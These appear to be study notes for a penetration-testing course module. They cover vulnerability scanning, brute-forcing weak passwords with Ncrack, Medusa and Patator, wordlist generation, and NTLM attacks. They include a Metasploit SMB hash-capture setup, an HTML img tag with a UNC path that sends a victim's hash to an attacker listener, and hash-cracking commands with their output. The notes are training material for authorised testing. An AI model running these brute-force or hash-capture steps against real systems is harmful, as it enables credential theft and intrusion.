# [ECPPT](https://members.elearnsecurity.com/courses/penetration_testing_professional_v5)
__________________________
# Network Security
# Module 5 - Exploitation

https://cdn.members.elearnsecurity.com/ptp_v5/section_2/module_5/html/index.html

__________________________
###### Module Map
1. Vulnerability Assessment
2. Low Hanging Fruits
3. Exploitation

__________________________
## 5.1. Vulnerability Assessment
The vulnerability assessment phase is aimed at building a list of the vulnerabilities present on target systems. The penetration tester has to carry out a vulnerability assessment on each target found in the previous steps.

The next phase, exploitation, will walk through this list to exploit the systems, because the bigger the list, the greater the chance of exploiting in scope assets.

There are 2 ways of carry out a vulnerability assessment, manually or using automated tools.

Vulnerability assessment tools are scanners that send probes to the target systems in order to detect whether a host has some well known vulnerabilities.

  Once the vulnerability scan is complete, the scanner will deliver a report that the pen-tester can use in the exploitation phase.

  Although automated scanners are able to perform a significant number of probes, it is extremely important to properly configure them. One of the ways we do this is by leveraging the information collecting in the previous steps.

  If you do not configure them properly, the scanner(s) will blindly perform all of their probes, therefore, executing probes that do not even apply to the target or target system technologies.

  This would increase the chances of both crashing services and would also take more time than necessary.

Most of the time, this phase is completed by using both automated scanners and manual inspection

Automated tools can help carry out a penetration test, however, they cannot perform a penetration test on their own.   

#### 5.1.1. Vulnerability Scanners
A vulnerability assessment, in the same manner as a penetration test, can be carried out both locally and remotely.

Checking one or more systems for all the known vulnerabilities would be infeasible, so penetration testers can use a vulnerability scanner to help streamline the process.

  Please take into consideration that this is a very loud process and therefore, if stealth is a necessity for a pen-test, vulnerability scanners are probably not the best idea.

Scanners use a database of known vulnerabilities to detect the vulnerabilities of a system.

Scanners perform their probes on:
 - Daemons listening on TCP and UDP ports
 - Configuration files of OS, software suites, network devices, etc
 - Windows registry entries

The purpose is to find vulnerabilities and misconfigurations.

The scanner's vendor keeps the tools and its database up to date with both new security checks and vulnerability signatures.
  The newer the database updates, the better and more relevant the scan results will be.

There are a great deal of vulnerability scanners out there, such as (OpenVAS)[http://www.openvas.org/], (Nexpose)[http://www.rapid7.com/products/nexpose/index.jsp], or (GFI LAN Guard)[http://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard]. Although they are all valid tools, in the next sections, we will utilize (Nessus)[http://www.tenable.com/products/nessus]

#### 5.1.2. Nessus
(Nessus)[http://www.tenable.com/products/nessus] is a complex and powerful vulnerability assessment tool that lets you scan ports, find running services, and assess vulnerabilities on the remote server.

It is composed of 2 components: a client and a server.
We will use the client to configure the scans, while we will use the server to actually perform the scanning process and report the results back to the client.

  The client component offers a web interface to interact and configure your scans.

  The server component performs the scan by sending probes to systems and applications, collecting the responses and matching them against its vulnerability database.

  You can run both components on the same machine, therefore making it both a simple and effective configuration for a home network or a lab environment.

Every vulnerability scanner roughly performs the same steps during a scan.
  The first step is determining if the target hosts are alive and subsequently, which ports are open on them.
    In order to do that, the vulnerability scanner performs a port scan to test for open ports on the system(s). The more accurate the port scan, the more useful the results of the scanner will be.

    For every port found, the vulnerability scanner will send special probes to determine which application (name and version) is running on them.

    For each detected service (also known as daemon), the scanner queries its database looking for known vulnerabilities.

    When configuring the scanner, you can configure which vulnerabilities you want to check. This highly depends upon the type of Pen-test you are running, the scope of the engagement and the agreements with you particular client.

    Example:
      You can configure a scanner to ignore the OS vulnerabilities and test only known we servers vulnerabilities.

  Then the scanner send probes to verify if the vulnerability actually exists.
    This phase is, however, highly prone to false positives as some probes could be too mild to effectively identify a real vulnerability.

__________________________
## 5.2. Low Hanging Fruits
Too many Penetration Testers do not pay attention to Low Hanging Fruits (LHF), which could cut down their assessment timeframes and help them in immediate gaining access to a remote system with little effort.

When we talk about low hanging fruits, we mean:
- Misconfigured servers
- Unimplemented or badly implemented ACLs (Access Control List)
- Default or weak passwords
- Open SMB shares / Null sessions
- Broadcast Request
- Vulnerabilities related to public exploits
- and so on

You should already be familiar with some of these techniques. In the previous modules you not only learned how to verify the presence of vulnerable SMB/NetBIOS shares (open shares with NBTstat and null sessions with Winfo / other tools), but also publically available exploits (with Nessus). Also we looked at sniffing and unpacking broadcast messages (with Wireshark and sniffing tools).

In the next sections we will shelve these skills and focus primarily on how to test systems for weak and default passwords

#### 5.2.1. Weak Passwords
After many years of information security and billions of dollars spent in this field, passwords are still one of the weakest links. This should be your top priority in this phase. We will cover some tools that will allow us to find and test:
- Weak passwords
- Default passwords

We will use them on common services like SMB, RDP, FTP, SQL, and so on.

###### 5.2.1.1. Ncrack
[Ncrack](http://nmap.org/ncrack/) is a high-seed network authentication cracking tool that allows the testing of hosts and their services for poor password.

Although it is not currently maintained and it has been replaced by Nmap NSE scripts, it is still a valid and effective tool. You can find its manual [here](http://nmap.org/ncrack/man.html). In the next sections, we will move on to more modern/updated tools.

You can read the help manual with the `ncrack -h`

The first thing to note when starting to use Ncrack is how to specify targets. Assuming the target network is 10.10.10.0/24, we can specify that in many ways, see below:
|         Command          | Description                                         |
|--------------------------|-----------------------------------------------------|
| `ncrack 10.10.10.0/24`   | Uses the entire network, 10.10.10.0 to 10.10.10.255 |
| `ncrack add.els.com`     | Uses the IP address of add.els.com                  |
| `ncrack 10.10.1,2.1-200` | Sends the probes to all ip address within the range 1-200 in the subnets 10.10.1 and 10.10.2                                         |
| `ncrack 10.10.10.56`     |  Sends probes only to the 10.10.10.56 IP address    |

The next options that we will see are used to specify the services we wish to target.
Ncrack supports the following services:
- FTP
- SSH
- Telnet
- HTTP(S)
- POP3(S)
- SMB
- RDP
- VNC

The standard notation is :
  ```
  <service_name>://target:<port_number>
  ```

Suppose we both want to target the Telnet service on the target machine with the IP address 10.10.10.130. Our command will look like the following:
  ```
  ncrack telnet:/10.10.10.130:25
  ```

  The options *<service_name>* and *<port_number>* are optional, therefore, if we know that there is an SSH service on a default port we can user the following command:
    ```
    ncrack ssh://10.10.10.130
    ```

    This will probe the IP 10.10.10.130 on port 22. We also have the freedom that if we know the service is not running on its default port (say it is on port 120), we can set it as follows:
      ```
      ncrack ssh://10.10.10.130:120
      ```

Notice that we can also set specific services for specific targets. Let's say we wish to probe the 10.10.10.130 for the SSH service (on port 22) and 10.10.10.60 for Telnet service (on port 218), we can use the following command:
  ```
  ncrack ssh://10.10.10.130 telnet://10.10.10.60:218
  ```

The last item to note about the service specification is that we can specify them globally. Service specified in this way are applied to all the hosts that have not been associated with the previous (per-host) specification format.

To do this, we can use the `-p` parameter, followed by the list of services (comma separated). For example:
  Let us suppose we want to crack the two IPs on 10.10.10.10 and 10.10.10.15 for SSH on port 50 and telnet on its default port. The command to run this attack will look like the following:
    ```
    ncrack 10.10.10.10,15 -p ssh:50,telnet
    ```

Now that we know how to specify hosts and services, let us see how to set username and password.
  Ncrack already has lists of common usernames and passwords that we can use during our tests.

  You can find these in the Ncrakc default folder:
    ```
    stduser@els: $ ls -l /user/share/ncrack
    total  944
    -rw-r--r--     1    root    root     6564     Jan 12 2014     common.usr
    -rw-r--r--     1    root    root    47049     Jan 12 2014     default.pwd
    -rw-r--r--     1    root    root     3489     Jan 12 2014     default.usr
    -rw-r--r--     1    root    root    22414     Jan 12 2014     jtr.usr
    ...
    ```

  We can specify the wordlist to use with the `-U` and `-P` options:
    - `-U <path_to_username_file_wordlist>`
    - `-P <path_to_password_file_wordlist>`

  If we want to try custom usernames and passwords, without using dictionaries, we can provide them as follows:
    - `-u username1, username2, ...`
    - `-p pwd1, pwd2, ...`

  Notice, by default, Ncrack iterates usernames for a fixed password.
  If you want to do the opposite you can use the option `--password-first`

Other useful options that we can use are:
  - `-v` for verbosity
  - `-d[0-10]` for debugging level
  - `-f` to exit once it finds valid credentials
  - `--resume <path>` to continue previously saved sessions

It is important to know that Ncrack can be used in conjunction with Nmap.
Indeed we can:
  - perform any kind of scan with NMap
  - export the results (`-o[N/X/L]` option)
  - feed Ncrak with Nmap results with the option `-i[N/X/L]`

This will avoid setting IP addresses and services since they are already set in the Nmap output file. You only need to set the service options, usernames, and passwords lists.

###### 5.2.1.2. Medusa
Another valid tool that we can use to exploit weak and default password is [Medusa](http://h.foofus.net/?page_id=51).

Medusa works similarly to Ncrack, but it offers more options and supports more services. You can see a [comparison](http://foofus.net/goons/jmk/medusa/medusa-compare.html) of the 2 tools features, [Git repo](https://github.com/jmk-foofus/medusa) and [user manual](http://foofus.net/goons/jmk/medusa/medusa.html).

In order to see its options and arguments, we can run `medusa` in your terminal windows (without options).

  As we can see from the help manual, the main options that we can use to specify our targets and passwords/username combinations are:
    - `-h [TARGET]` : Target hostname or IP address
    - `-H [FILE]`   : File containing target hostnames or IP addresses
    - `-u [TARGET]` : Username to test
    - `-U [FILE]`   : File containing usernames to test
    - `-p [TARGET]` : Password to test
    - `-P [FILE]`   : File containing passwords to test

  In order to list all the available modules (service that Medusa can target), we can use the `-d` option.

  If we want to know more about a specific module, we can use the `-q` option to display the module usage information. For example : `medusa -M telnet -q`

If we want to target the telnet service running on the host the host 192.168.102.149, we can run:
  ```
  medusa -h 192.168.102.149 -M telnet -U username.lst -P password.lst
  ```

  If medusa finds valid credentials, it prints out the message *ACCOUNT FOUND*.
  If you want more information about Medusa tasks, you can set the verbosity level with the `-v` option.

###### 5.2.1.3. Patator
The last tool we are going to inspect is called [Patator](https://github.com/lanjelot/patator).
It differs from other similar tools since it is very flexible and modular but, also allows you to avoid false negative results.

It may seem a bit cumbersome to use at first, but once you understand its syntax, you'll love it.

In contrast to almost all the other tools, Patator does not really offer a help manual.
  In order to see how its works and its usage, you have to inspect the `patator.py` file.
    It is here,, before the actual source code, you will find the *USAGE* section which contains some examples for the different modules and options.

  The alternative way to understand how to use it, is by running `patator` in you terminal window, followed by the module name you want to use and then the `--help` option.
    For example, if we want to obtain the module usage of `ssh_login`:
      ```
      patator ssh_login --help
      ```

  Moreover, notice that we can retrieve the entire list of modules by running Patator with no arguments.

The best way to learn how to use Patator is to inspect some of the examples it provides in conjunction with inspecting their arguments.
  Let's start with some basic commands:
    ```
    patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
    ```
  As we can see, this command will try to bruteforce the SSH service (`ssh_login` module) running on the host 10.0.0.1 (`host` parameter)

  Of course, we have to specify the usernames and passwords to use. We do this with the `user` and `password` parameters:
    - With `user=root` we specify one single username to test
    - With `password=FILE0` we are using what Patator calls placeholders.
        `FILE` is a keyword that tells Patator we want to use a file containing the actual words to test (a list of passwords in our case).

        The `0` at the end of the placeholder is used to both match the corresponding wordlist (`0=passwords.txt`) and indicate what order to iterate over all the wordlists.

        So if we have additional placeholders (`FILE0` and `FILE1`), Patator uses the first entry in `FILE0` and iterates through all the entries in `FILE1`. Then it takes the second entry in `FILE0` and iterates through all the words contained in `FILE1`, and so on.

        Example:
          ```
          patator [module] host=FILE0 user=FILE1 password=FILE2 0=hosts.txt 1=logins.txt 2=pwd.txt
          ```
    - `-x` : Allows us to specify what to do (action) upon receiving the expected results.
        In our case, we are telling Patator to `ignore` the results obtained, if they contain the message (`mesg`) `Authentication Falied`.

        This option highly customizable in order to describe any type of situation

Now that we have a basic idea of how to configure Patator, let's try to run it against an actual service and see how it reacts.
  The target of our tests is 192.168.102.155 and the wordlists for the usernames and passwords are `username.lst` and `password.lst`, respectively.

  In order to better understand how Patator works, we will not specify any action and condition in our first test.

  Our first command will be the following (see image):
    ```
    patator ssh_login host=192.168.102.155 user=FILE0 password=FILE1 0=username.lst 1=password.lst
    ```
    Patator will return a large amount of information.
      We can not only see the time and credentials used but also the message returned by the service. Indeed, we can see that if the credentials are not valid, we get "`Authentication failed`".
      If the credentials work however, we get the SSH service version "SSH-2.0-OpenSSH_6.6.1"

    Let now use the `-x` option in order to ignore all the responses with the "Authentication failed" message.

  Our command will look like the following:
   ```
   patator ssh_login host=192.168.102.155 user=FILE0 password=FILE1 0=username.lst 1=password.lst -x ignore:mesg='Authentication failed'
   ```

   As we can see, this time Patator returns only working credentials and ignores all the other responses with the "`Authentication failed`" string.

###### 5.2.1.4. EyeWitness
An excellent tool we can use to help us identify low-hanging fruits as it applies to web applications and networking devices that may be using default credentials is a tool known as [EyeWitness](https://github.com/ChrisTruncer/EyeWitness).

Designed to run on Kali Linux, EyeWitness can grab screenshots of web applications, networking devices, and mostly any other device that has HTTP or HTTPS enabled on a port, and can also quickly determine whether or not default credentials are being used for any of those devices.

It is an excellent tool to quickly identify low-hanging fruit that can be used as an initial foothold. You can download the tool [here](https://github.com/ChrisTruncer/EyeWitness)

  Another great thing a bout EyeWitness, is that it will create a report in HTML that we can use to quickly review our results.

Getting up and running with EyeWitness is straightforward.
  Once we have downloaded the tool from the github repository, we can run *setup.sh* script from within the *setup* directory. This will install everything needed to run the tool.
    ```
    root@tester:~/tools/EyeWitness/setup# ./setup.sh
    ```

  Once installed, a typical command line we can use to kick-off a scan is like so, where *urls.txt* is a file containing a list of URLs or IP addresses:
    ```
    # python EyeWitness.py --headless --prepend-https -f urls.txt
    ```

  It then will generate an HTML report (see image).

Important:
  EyeWitness also contains an `--active-scan` option which will actively attempt to log into any and all devices found using known default credentials.

  Keep in mind that using this option however, can results in account lockouts and will likely generate IDS or HDS alerts. Use `--active-scan` option with caution.

###### 5.2.1.5. Rsmangler
At this point, we're used to using pre-compiled password dictionary wordlists or list containing default credentials as a starting point for mounting password brute-force attacks, but we should also become familiar with several tools we can use  to generate more targeted wordlists.

One of those tools, [Rsmangler](https://digi.ninja/projects/rsmangler.php) by DigiNinja can be used to help us generate targeted wordlists we can use for our dictionary attacks.

Rsmangler, will take an existing wordlist and perform various manipulations resulting in more targeted wordlist which will include permutations and variations or words we can in our wordlist.

With Rsmangler and other wordlist generator tools, we'll typically want to start with a small list of several words since just supplying a few words to start, can quickly generate a very large file.

As an example, let's take a fictitious organization "Robot Industries LLC", and from the name, we'll create a list (words.txt) of three words:
  - Robot
  - Industries
  - LLC

Using the following command line, we can generate a list containing variations and permutations of the above:
  ```
  cat words.txt | rsmangler --file - > words_new.txt
  ```

Using our initial 3-word wordlist, and running it with Rsmangler defaults, we've ended up with a list of 7,780 permutations, some of which can be seen below.

We can see how this can be useful from the standpoint of creating a list that's specific to the target organization.

###### 5.2.1.6. CeWL
Another excellent wordlist generation tool from the same author is [CeWL](https://digi.ninja/projects/cewl.php)

CeWL takes our wordlist generation a step further and will scrape a target organization's website for keywords, and in turn, will generate a list of words we can use for our wordlist.

A typical command line for using CeWL would be something like the following where the `-m` flag with a value of `8` will create a list of words with a minimum of 8 characters:
  ```
  cewl -m 8 http://www.google.com
  ```

We could then, of course further improve our wordlist using Rsmangler to create permutations of the keywords identified with CeWL.

###### 5.2.1.7. MentalList
In addition to command-line tools, we can use to help us generate customized wordlists, the [Mentalist](https://github.com/sc0tfree/mentalist) tool provides us with a GUI front-end we can use to generate comprehensive wordlists well.

Mentalist can also generate files that can be used with Hashcat and John the Ripper.

You can learn more about this tool [here](https://github.com/sc0tfree/mentalist/wiki).

Pre-compiled Mentalist executables for both Windows and Linux can be downloaded from [here](https://github.com/sc0tfree/mentalist/releases) as well.

__________________________
## 5.3. Exploitation
Once we have attempted to exploit weak, remote authentication we can move on the next phase: **exploitation**

Having found vulnerabilities within our target, we can now proceed with their exploitation. Although there are many exploits available online that you can download, compile and run against your target machines, we will use a very powerful tool: [Metasploit](http://www.metasploit.com/)

First, we will show some basic usage of Metasploit and then we will get deeper into the exploitation. Notice that most of the exploit can be divided in 3 categories:
- Client-side exploits
  They usually require user interaction in order to be triggered (open a link, an executable file, etc.)
- Remote exploits
  Do not require user interaction and usually affect services listening on the network
- Local privilege escalation
  The attacker has access on the machine (limited) thus, the exploit allows the attacker to gain higher privileges on the machine

#### 5.3.1. Metasploit In General
Metasploit is an exploitation framework that makes it very easy to access a library of exploits created by the community.

Knowing how to use the most important Metasploit features will help you to speed up various process and tasks. It will also help you implement, create, and develop exploits.

One of its main features is the ability to easily write, extend, and customize the framework in order to include custom exploits or payloads.

**Find the info on your own or from the vids**

#### 5.3.2. Windows Authentication Weakness
Before seeing client and remote side exploits, let's focus on one of the first and easiest attacks a penetration tester may run against Windows systems.

We will see, by exploiting the weak Windows authentication protocols, that we may be able to gain access to the remote systems.

The authentication protocol used between Windows clients and servers is called [NTLM](https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx)(NT LAN Manager).
  Although NTLM has been replaced by Kerberos, it is still widely used and supported in Windows machines.
  For example, it is used either when the client is authenticating to a server using an IP address or, when the client id authenticating to a server that does not belong to the same domain.

In order to understand future NTLM attacks explained in this module, we first have to understand how NTLM works.
  NTLM authentication is a challenge/response protocol and consists of 3 messages:
  - Type 1 (negotiation)
  - Type 2 (challenge)
  - Type 3 (authentication)

The whole challenge/response works like this:
  1. The clients send the Type 1 message, which contains the username (in plaintext)
  2. The server generates the challenge and sends it back to the client
  3. The client encrypt the challenge with the hash of the user password and returns the results of the computation to the server

As you can imagine, the actual password is never sent on the network, since it is hashed and encrypted.
  The schemes used to encrypt and send the Type 3 response have changed over the years due to lack of security.

  The very first scheme was LM, which turned out to be very simple and easy to crack.
  As the result, it was replaced by NTLM, which in turn was deprecated by NTLMv2 and finally Kerberos at the end.

Notice that recent Windows OS might still store LM hashes for backward compatibility and send them with the NTLM protocol.

Now that we know a bit more about how the authentication process works, let us dive into how the response (Type 3) are generated and why they are so weak.

###### 5.3.2.1. LM/NTLMv1
The algorithm used to compute LM Hash is DES and here are the steps used by Windows to do so:
  1. Password is transformed to upper case
  2. Add null chars until it is 14-bytes long
  3. Split the password in two blocks (7 bytes chunks plus a byte of parity)
  4. Each of the 2 keys used to encrypt the fixed string `KGS!@#$%` (8 byte ciphertext)
  5. The 2 ciphertext are concatenated tot from a 16-byte value

  Example:
    `abcde` -> `ABCDE` -> `ABCDE_________` -> `ABCDE__``_______` -> `yVie567b``g1ver6Bq` -> `yVie567bg1ver6Bq`

The computation of the NTLM hashes is still very simple:
  1. The user's password is converted to Unicode
  2. MD4 is then used to get a 16-byte long hash

  By using Unicode, the allowed charset is much wider.
  Although it addresses some LM flaws, it is still considered weak.

  Moreover, the NTLM response it sent together with the LM response, most of the time.

  We do not want to go deeper in detail ion how these hashes are calculated.
  Instead, at this time we prefer to focus on the LM and NTLM authentication protocols that use the hashes to perform authentication.

Now that we know how Windows computes LM and NT hashes, let us quickly recap how the LM and NTLM authentication protocols works in order to completely understand how to attack them.
  As you already know, these protocols are used to authenticate a client to a server, where the server has some way to verify the credentials sent by the client.
  Notice that both protocols are identical, except for the hash they use in their message at step 3.

  The 2 protocols work as follows:
    1. The client sends a request for authentication
    2. Server sends a 8-byte challenge (random value)
    3. Client encrypts the challenge using the password hash and send it back as response

  The goal of our attack is to gain the password hash through the implementation of this protocol.

  During the attack we will impersonate the server.
  Notice that the most important part of the protocol is step 3, where the client hash resides.

  Hashing process in general:
    1. The generated hash (16-btyes long) is padded with 5 null bytes making it a 21-bytes string. <br>
      Example : `1A2B3C4D5E6F7G1A2B3C4D5E6F7G1A2B``0000000000` <br>
      Note : this is called NTLM hash that is different from the NT hash

    2. This 21 bytes string is split into 3 blocks, 7 bytes long each + 1 parity byte.
    The response will be then 24 bytes long. <br>
      Example : `1A2B3C4D5E6F7G``1A2B3C4D5E6F7G``1A2B0000000000`

    3. Each of these blocks will be the key to encrypt the Server challenge sent during message 2. <br>
      Note that in the attack scenario we impersonate the server, and the challenge is chosen by us.

  If you want to go more in detail about the challenge response, you can check the [following online resource](http://davenport.sourceforge.net/ntlm.html#theType3Message).

Now that we know how LM and NTLMv1 authentication protocols work, we can move on and see how, as penetration tester, we can exploit their weaknesses.

To conduct a successful attack, we must first understand the weakness of the protocols:
  - No diffusion, meaning that each part of DES output is not linked to previous one.
      This allows attacks on the three blocks individually.
  - DES is an old algorithm with intrinsic weaknesses
      The third DES key is much weaker than the others, since it has 5 null bytes for padding.
  - The only randomness in the protocol is the server challenge (step 2 of the protocol) (Again, we impersonate the server, so we control that)

Let's now focus on how an attack can exploit these weaknesses.
  Our goal is to capture the client response (step 3 of the protocol - type 3 message)

  There are 2 methods we can use:
    1. Force the client (target) to start a connection to us (fake server)
    2. Use MitM techniques in order to sniff the client response

  In the next sections we will focus on the first one.

  The first item we need to address in this exploitation process, is to create a listening SMB service that will both accept incoming connections, and send back a fixed challenge.
    As you can imagine, we use a fixed challenge to help us in decrypting the response.

    Although there are many tools that allow us to do this, we will use the following Metasploit [module](http://www.metasploit.com/modules/auxiliary/server/capture/smb).

    The following snapshot shows the module we are going to use for our tests:
      ```
      msf auxiliary[smb] > use auxiliary/server/capture/smb
      msf auxiliary[smb] > show options

      Module options [auxiliary/server/capture/smb]:
        Name        Current Setting   Required  Description
        ----        ---------------   --------  -----------
        CAINPWFILE                    no        The local filename to store the hashes in Cain&Abel format
        CHALLENGE   1122334455667788  yes       The 8 byte server challenge
        JOHNPWFILE                    no        The prefix to the local filename to store the hashes in John format      
        SRVHOST     0.0.0.0           yes       The local host to listen on. This must be an address on the local machine       
        SRVPORT     445               yes       The local port to listen on

      Auxiliary action:
        Name      Description
        ----      -----------
        Sniffer
      ```

    As you have already noticed, the `challenge` response is fixed to the value `1122334455667788`. It is a common practice to use this value.

    Moreover, let us also set the `JOHNPWFILLE` option in order to tell Metasploit to automatically save the hashes to a file.
      Notice that these hashes will be automatically saved and formatted to work with John the Ripper.

    You should know that there is no timestamp or nonce in the Type3 message of the protocol.
      Therefore, since we control the challenge (that acts as a salt in the hash). we can use rainbow tables, which can be found on various internet locations or torrents, to crack these hashes.

      These tables have been built for the 8 byte server challenge we just saw (`1122334455667788`)

  Once the Metasploit listener is set up, we can move on the next step, which is to force the client to start a connection to it.
    One of the easiest ways to force the initiation of the NTLM protocol is through SMB authentication.

    For example, we can embed a Universal Naming Convention (UNC) path (`\\SERVER_IP\\SHARE`) into an email message or a web page.

    This again, will force the victim's system to authenticate to the SMB listener on our machine. The following HTLM tag will do just fine:
      ```
      <img src="\\192.168.102.147\ADMIN">
      ```
      Here, `192.168.102.147` is our server with the listener

    The following snapshot shows what happens when someone opens the page and attempt a connection to our listener.
      ```
      msf auxiliary[SMB] > run
      (*) Auxiliary module execution completed

      (*) Server started
      msf auxiliary[SMB] > (*) SMB Capture - Empty hash captured from 192.168.102.135:1040 - 192.168.102.135 captured.
      (*) SMB Captured - 2016-02-17 10:40:53 -05000
      NTLMv1 Response Captured from 192.168.102.135:1040 - 192.168.102.135
      USER:els DOMAIN:ELS-CF2B00A3CBC OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
      LMHASH:52f46e71875e8c608e7c3d8cc080ae2a8f85252cc731bb25
      NTHASH:8286e6fe0f7355478f16de535ade37d55e6d0c0f9e3ccd59
      (*) SMB Captured - 2016-02-17 10:40:55 -05000
      NTLMv1 Response Captured from 192.168.102.135:1040 - 192.168.102.135
      USER:els DOMAIN:ELS-CF2B00A3CBC OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
      LMHASH:52f46e71875e8c608e7c3d8cc080ae2a2f85252cc731bb25
      NTHASH:8286e6fe0f7355478f16de535ade37d55e6d0c0f9e3ccd59
      ```

    Also notice that every time the client connects to us, the hash remains the same (the challenge is fixed). This demonstrates that the protocol's randomness is defeated using the crafted challenge : `1122334455667788`.
      So, we can state that there is no randomness at all.

    LMHASH and NTHASH represent the response by the client during the NTLM protocol.
      Note that in the previous snapshot, LMHASH and NTHASH are different, indicating that LM is in use.
      If both hashes are the same, it would mean that only NT hashes are in use on the remote client.

    It is very useful to know that when the password length is =< 7 characters (i.e. `1234567`), the last 8 bytes of the NTLM response are always the sane: `2f85252cc731bb25`

    The following snapshot shows 2 captured responses, each with password less than 7 characters. As we can see, the last 8-bytes of LMHASH do not change.
      ```
      (*) SMB Captured - 2016-02-17 10:40:12 -05000
      NTLMv1 Response Captured from 192.168.102.135:1040 - 192.168.102.135
      USER:els DOMAIN:ELS-CF2B00A3CBC OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
      LMHASH:fce0288fcecDeda10dd0009b188149b92f85252cc731bb25
      NTHASH:fecbd648564a732928587b7a4632221826d57bde8b324a02
      (*) SMB Captured - 2016-02-17 10:40:26 -05000
      NTLMv1 Response Captured from 192.168.102.135:1040 - 192.168.102.135
      USER:els DOMAIN:ELS-CF2B00A3CBC OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
      LMHASH:52f46e71875e8c608e7c3d8cc080ae2a2f85252cc731bb25
      NTHASH:8286e6fe0f7355478f16de535ade37d55e6d0c0f9e3ccd59
      ```

  Now that we have the hashes, we can start cracking them in different ways with different tools.
    If you remember, we set the Metasploit module to automatically save the credentials into a file. The following is the content of the file:
      ```
      root@els:~# cat hashpwd_netntlm
      els:;ELS-CF2B00A3C8C;52f46e71875e8c608e7c3d8cc080ae2a2f85252cc731bb25
      8286e6fe0f7355475f16de535a4e37d55e6d0c0f9e3ccd59:1122334455667788
      ```

    We can now feed this file to John the Ripper and let it crack the password.
      The command we are going to use is very simple ([here](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats) you can find a list of formats and meaning):
        ```
        root@els:~# john --format-netlm hashpwd_netntlm
        Using default input encoding: UTF-8
        Using default target encoding: CP850
        Loaded 1 password hash (netlm, LM C/R [DES 32/64])
        Will run 2 OpenMP threads
        Press 'q' or Ctrl-C to abort, almost any other key for status
        ELS           (els)
        1g 0:00:00:00 DONE 1/3 (2016-02-18 04:04) 3.125g/s 25.00c/s 25.00C/s ELS..ELSES
        Use the "--show" option to display the cracked password reliably
        Session completed
        ```

        The password is `els`

      As you can see, cracking the previous hash took less than a second, but you should be aware that complex password hashes may take much more time.

    To quicken the cracking process we can use rainbow tables together with **rcrack_mt** (an edited version of *rcrack*)

      You can download the tables here:
      - [rcracki_mt](https://github.com/foreni-packages/rcracki_mt)
      - [Rainbow table 1](http://project-rainbowcrack.com/table.htm)
      - [Rainbow table 2](http://ophcrack.sourceforge.net/tables.php)

      Once we have downloaded the correct tables and the tool, we can now copy the first 8-bytes of the LMHASH response and use them to start the cracking process.
        ```
        msf auxiliary(smb) > (*) SMB Captured - 2016-02-18 05:00:02 -0500
        NTLMv1 Response Captured from 192.168.102.135:1501 - 192.168.102.135
        USER:els DOMAIN:ELS-CF2B0OA3CBC OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
        LMHASH:1f548398f0f49ea18e2f0dcb9562b75eaa32e75aebf1d69c
        NTHASH:2a37bff52112d55b41f4d124d3e508dd945b07bb1735ddbf
        ```

      Given the following hashes, the command we will run is:
        ```
        rcracki_mt -h 1f548398f0f49ea1 -t 4 *.rti
        ```

        Description:
        - `-h` is used to specify the first 8-bytes of the LMHASH
        - `-t` is the number of threads to use
        - `*.rti` is the path of the downloaded rainbow tables

      At the end of the process you should be able to obtain something similar to the screenshot (see image). The password recovered is `ELSPWD1`.

      The tool found the password in few seconds but, since we cracked just part of the hash, the real password may be longer than the one discovered.

    What we can do now is brute-force the remainder of the hash. In the `metasploit-framework/tools/password` folder, there is a ruby script named `halflm_second.rb` that does exactly what we need.
      We just need to feed the script with the entire hash and the first characters of the password we found.
        ```
        ruby halflm_second.rb -n
        1f548398f0f49ea18e2f0dcb9562b75eaa32e75aebf1d69c -p ELSPWD1
        ```

        Output:
        ```
        [*] Trying one character...
        [*] Trying two characters (eta: 2.229339599609375 seconds)...
        [*] Cracked: ELSPWD123
        ```

        Description:
        - `1f548398f0f49ea18e2f0dcb9562b75eaa32e75aebf1d69c` : complete hash
        - `ELSPWD1` : half discovered password

    Although, we cracked the entire password, we can see that it is all in uppercase, which may not be accurate (`ELSPWD123`). The next step is to find the case-sensitive password.
      To do this we can use a Perl script contained in the john folder: `netntlm.pl`:
      ```
      root@els:/usr/share/metasploit-framwork/data/john/run.linux.x64.mmx# perl netntlm.pl
      john-netntlm.pl v0.2

      JoMo-Kum <jmk@foofus.net>

      Usage: netntlm.pl [OPTIONS]
        netntlm.pl
        --seed [RainbowCrack/HalfLM Response Password]
        --file [File Containing LM/NTLK challenge/responses (.lc format)]
               Ex: Domain\User::LM response:NTLM response:challenge
      ```

      As you can see from the tool's help manual, we need to provide the LM/NTLM challenge/response and the password discovered. For the hash, we will use the file that Metasploit automatically created for us, thus our command is as follows:
        ```
        perl netntlm.pl -file /root/hashpwd_netntlm -seed ELSPWD123
        ```

    You can also use `netntlm.pl` in order to find the entire uppercase password (instead of `halflm_second`).
      Once again, we have to provide the challenge/response file and then seed it, see below (notice the seed is `ELSPWD1`):
        ```
        perl netntlm.pl -file /root/hashpwd_netntlm -seed ELSPWD1
        ```
        Output: `eLSPwd123`

###### 5.3.2.2. NTLMv2
So far we have seen how LM/NTLMv1 weakness could be easily exploited to obtain the user credentials.

To address these security concerns, NTLMv2 was developed and, since Windows Vista, it is used by default.
  The NTLMv2, introduced in Windows NT 4.0, still uses NT hashes, but with a much improved protocol.

The main difference with the old NTLMv1 is that the type 3 message is generated in a different way.
  Once again, the Type 3 message is the most important part of the protocol.
  The Type 3 message is where the protocol security resides.
  The NTLMv2 response is built as follows:
  - NTLMv2 hash
      Contains the HMAC-MD5 of the NT hash and the pair `<USERNAME, Server>`
        - `USERNAME` is uppercase and `Server` is case sensitive
  - NTLMv2 response
      Contains the HMAC-MD5(NTLMv2 Hash, <BLOB,Server_challenge>), sent along with the BLOB
        - (Server receives hash + blob)
        - Note that the BLOB contains a client challenge and the timestamp






###### 5.3.2.3. SMB Relay on NTLMv1


###### 5.3.2.4. SMB Relay on NTLMv2


###### 5.3.2.5. EternalBlue (MS17-010)


#### 5.3.3. Client-Side Exploitation


#### 5.3.4. Remote-Side Exploitation

__________________________
